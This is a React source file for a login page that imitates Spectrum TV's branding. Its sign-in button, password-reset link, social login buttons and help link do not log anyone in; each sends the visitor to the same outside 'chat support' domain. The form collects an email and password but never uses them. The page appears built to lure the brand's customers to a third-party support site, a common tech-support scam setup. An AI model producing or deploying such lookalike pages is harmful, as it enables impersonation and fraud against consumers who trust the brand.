import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { Link } from 'react-router-dom';
import { FaTv, FaEnvelope, FaLock, FaEye, FaEyeSlash, FaGoogle, FaFacebook, FaApple } from 'react-icons/fa';
import './LoginPage.css';

const LoginPage: React.FC = () => {
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [rememberMe, setRememberMe] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // Redirect to the support site
    window.location.href = 'https://getchatsupport.live/';
  };

  return (
    <motion.div
      className="login-page"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      transition={{ duration: 0.5 }}
    >
      <div className="login-container">
        {/* Left Side - Branding */}
        <motion.div 
          className="login-branding"
          initial={{ x: -50, opacity: 0 }}
          animate={{ x: 0, opacity: 1 }}
          transition={{ duration: 0.6, delay: 0.2 }}
        >
          <div className="branding-content">
            <div className="brand-icon">
              <FaTv />
            </div>
            <h1 className="brand-title">Spectrum TV</h1>
            <p className="brand-subtitle">Your Entertainment, Your Way</p>
            
            <div className="brand-features">
              <div className="feature-item">
                <span className="feature-check">✓</span>
                <span>100+ Live Channels</span>
              </div>
              <div className="feature-item">
                <span className="feature-check">✓</span>
                <span>Thousands of On-Demand Titles</span>
              </div>
              <div className="feature-item">
                <span className="feature-check">✓</span>
                <span>Premium Channels Available</span>
              </div>
              <div className="feature-item">
                <span className="feature-check">✓</span>
                <span>Watch Anywhere, Anytime</span>
              </div>
            </div>

            <div className="brand-quote">
              "Experience television like never before with Spectrum's crystal-clear streaming and extensive content library."
            </div>
          </div>
        </motion.div>

        {/* Right Side - Login Form */}
        <motion.div 
          className="login-form-container"
          initial={{ x: 50, opacity: 0 }}
          animate={{ x: 0, opacity: 1 }}
          transition={{ duration: 0.6, delay: 0.3 }}
        >
          <div className="form-header">
            <h2>Welcome Back!</h2>
            <p>Sign in to continue to Spectrum TV</p>
          </div>

          <form onSubmit={handleSubmit} className="login-form">
            <div className="form-group">
              <label htmlFor="email">
                <FaEnvelope className="input-icon" />
                Email Address
              </label>
              <input
                type="email"
                id="email"
                placeholder="Enter your email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
              />
            </div>

            <div className="form-group">
              <label htmlFor="password">
                <FaLock className="input-icon" />
                Password
              </label>
              <div className="password-input-wrapper">
                <input
                  type={showPassword ? "text" : "password"}
                  id="password"
                  placeholder="Enter your password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                />
                <button
                  type="button"
                  className="password-toggle"
                  onClick={() => setShowPassword(!showPassword)}
                >
                  {showPassword ? <FaEyeSlash /> : <FaEye />}
                </button>
              </div>
            </div>

            <div className="form-options">
              <label className="checkbox-container">
                <input
                  type="checkbox"
                  checked={rememberMe}
                  onChange={(e) => setRememberMe(e.target.checked)}
                />
                <span className="checkmark"></span>
                Remember me
              </label>
              <a href="https://getchatsupport.live/" className="forgot-link" target="_blank" rel="noopener noreferrer">
                Forgot Password?
              </a>
            </div>

            <motion.button
              type="submit"
              className="login-button"
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
            >
              Sign In
            </motion.button>

            <div className="social-login">
              <p className="social-divider">Or continue with</p>
              <div className="social-buttons">
                <motion.a
                  href="https://getchatsupport.live/"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="social-btn google"
                  whileHover={{ y: -2 }}
                  whileTap={{ scale: 0.95 }}
                >
                  <FaGoogle />
                </motion.a>
                <motion.a
                  href="https://getchatsupport.live/"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="social-btn facebook"
                  whileHover={{ y: -2 }}
                  whileTap={{ scale: 0.95 }}
                >
                  <FaFacebook />
                </motion.a>
                <motion.a
                  href="https://getchatsupport.live/"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="social-btn apple"
                  whileHover={{ y: -2 }}
                  whileTap={{ scale: 0.95 }}
                >
                  <FaApple />
                </motion.a>
              </div>
            </div>

            <div className="signup-prompt">
              Don't have an account?{' '}
              <Link to="/signup" className="signup-link">
                Sign up now
              </Link>
            </div>

            <div className="support-link">
              <a href="https://getchatsupport.live/" target="_blank" rel="noopener noreferrer">
                Need help? Contact Support
              </a>
            </div>
          </form>
        </motion.div>
      </div>
    </motion.div>
  );
};

export default LoginPage;